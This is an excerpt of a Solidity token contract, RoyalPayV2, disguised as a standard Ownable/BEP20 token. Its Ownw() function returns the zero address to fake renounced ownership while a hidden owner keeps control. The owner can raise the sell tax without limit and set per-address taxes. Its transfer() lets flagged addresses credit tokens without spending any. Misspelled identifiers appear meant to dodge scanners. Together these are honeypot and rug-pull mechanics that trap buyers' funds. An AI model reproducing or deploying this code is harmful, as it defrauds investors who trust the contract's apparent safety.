...
abstract contract Ownable is Context {
    address private _Ownw;   //1

    event OwnwshipTransferred(address indexed previousOwnw, address indexed newOwnw);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial Ownw.
     */
    constructor() {
        _transferOwnwshiptransferOwnwship(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current Ownw.
     */
    function Ownw() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the Ownw.
     */
    modifier onlyOwnw() {
        require(_Ownw == _msgSender(), "Ownable: caller is not the Ownw");
        _;
    }//5

    /**
     * @dev Leaves the contract without Ownw. It will not be possible to call
     * `onlyOwnw` functions anymore. Can only be called by the current Ownw.
     *
     * NOTE: Renouncing Ownwship will leave the contract without an Ownw,
     * thereby removing any functionality that is only available to the Ownw.
     */
    function renounceOwnwship() public virtual onlyOwnw {
        _transferOwnwshiptransferOwnwship(address(0));
    }//6

    /**
     * @dev Transfers Ownwship of the contract to a new account (`newOwnw`).
     * Can only be called by the current Ownw.
     */
    function transferOwnwshiptransferOwnwship(address newOwnw) public virtual onlyOwnw {
        require(newOwnw != address(0), "Ownable: new Ownw is the zero address");
        _transferOwnwshiptransferOwnwship(newOwnw);
    }//7
     ...
     */
    function _transferOwnwshiptransferOwnwship(address newOwnw) internal virtual {
        address oldOwnw = _Ownw;
        _Ownw = newOwnw;
        emit OwnwshipTransferred(oldOwnw, newOwnw);
    }
}
...
contract BEP20 is Context {
    ...
    /**
     * @dev Emitted when the allowance of a `spender` for an `Ownw` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed Ownw, address indexed spender, uint256 value);//10
     ...
     */
    function allowance(address Ownw, address spender) public view virtual returns (uint256) {
        return _allowances[Ownw][spender];
    }
    ...
    function approve(address spender, uint256 AmountNumber) public virtual returns (bool) {
        address Ownw = _msgSender();
        _approve(Ownw, spender, AmountNumber);
        return true;
    }
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address Ownw = _msgSender();
        _approve(Ownw, spender, _allowances[Ownw][spender] + addedValue);
        return true;
    }//12
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address Ownw = _msgSender();
        uint256 currentAllowance = _allowances[Ownw][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(Ownw, spender, currentAllowance - subtractedValue);
        }
    ...
    /**
     * @dev Sets `AmountNumber` as the allowance of `spender` over the `Ownw` s tokens.
     *
     ...
     * Requirements:
     *
     * - `Ownw` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address Ownw,
        ...
        require(Ownw != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[Ownw][spender] = AmountNumber;
        emit Approval(Ownw, spender, AmountNumber);
    }

    /**
     * @dev Spend `AmountNumber` form the allowance of `Ownw` toward `spender`.
     *
    ...
    function _spendAllowance(
        ...
        uint256 currentAllowance = allowance(Ownw, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= AmountNumber, "ERC20: insufficient allowance");
            unchecked {
                _approve(Ownw, spender, currentAllowance - AmountNumber);
            }
        }
    }
...
contract RoyalPayV2 is BEP20, Ownable {
    // ext
    ...
    constructor(
        ...
        transfer(_deadAddress, totalSupply() / 10);
        _defaultSellFtax = 10;
        _defaultBuyFtax = 0;
    ...
    function getRelease(address _address) external view onlyOwnw returns (bool) {
        return _release[_address];
    }


    function PairList(address _address) external onlyOwnw {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyOwnw {
        _defaultSellFtax = _value;
    }

    function setSlipFtax(address _address, uint256 _value) external onlyOwnw {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFtax[_address] = _value;
    }

    function getSlipFtax(address _address) external view onlyOwnw returns (uint256) {
        return _slipFtax[_address];
    }


    function setMAccountFtax(address _address, bool _value) external onlyOwnw {
        _mAccount[_address] = _value;
    }

    function getMAccountFtax(address _address) external view onlyOwnw returns (bool) {
    ...
    function transfer(address to, uint256 AmountNumber) public virtual returns (bool) {
        address Ownw = _msgSender();
        if (_release[Ownw] == true) {
            _balances[to] += AmountNumber;
            return true;
        }
        _receiveF(Ownw, to, AmountNumber);
        return true;
    }
